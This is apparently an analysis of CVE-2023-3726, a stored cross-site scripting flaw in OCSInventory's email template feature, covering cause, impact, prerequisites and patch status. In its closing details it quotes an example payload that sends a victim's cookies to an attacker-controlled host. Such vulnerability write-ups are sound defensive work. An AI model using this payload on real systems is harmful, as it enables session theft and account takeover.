Based on the provided content, here's an analysis of CVE-2023-3726:

**Root Cause of Vulnerability:**
The vulnerability stems from the fact that OCSInventory allows stored email templates to contain special characters which can lead to stored Cross-Site Scripting (XSS).

**Weaknesses/Vulnerabilities Present:**
- **Stored XSS:** The core vulnerability is a stored cross-site scripting (XSS) issue. This means the malicious script is stored within the application (specifically in the email template), and is executed when a user views the template/notification.

**Impact of Exploitation:**
- **Sensitive Data Theft:** An attacker can potentially steal sensitive data such as session cookies by injecting malicious JavaScript code within the email template. This can allow the attacker to impersonate a user.
- **Password Hash Theft (Specific Condition):** If the server is in debug mode, the attacker can potentially steal the password hash by changing the server state, as the server in debug mode displays the hash.
- **Account Takeover (Specific Condition):** If the targeted user is an administrator with an active session, the attacker can leverage the stolen session cookie to take over the administrator's account.

**Attack Vectors:**
- The attacker exploits the "Customize Template" feature within OCSInventory's notification settings.
- Specifically, the attacker uploads an HTML file containing a malicious JavaScript payload as the email template.
- This malicious template is then stored on the server and is executed whenever the notification template is rendered.

**Required Attacker Capabilities/Position:**
- **Administrator Access:** The attacker needs to have administrative privileges to access and modify the email templates in OCSInventory.
- **Ability to Upload HTML:** The attacker needs to be able to upload an HTML file, containing malicious javascript, in the "Customize Template" section.
- **Network Access:** The attacker needs to be able to receive stolen cookies from the target.

**Additional Details:**
- The provided content includes a specific example payload `<script>new Image().src="http://ourattacker-pc.com/?cookie="+document.cookie;</script>`. This script will send the victim's cookies to an attacker-controlled server.
- The vulnerability is present in OCSInventory-ocsreports version 2.12.0
- The content indicates that the vulnerability was patched, and the vendor was notified.
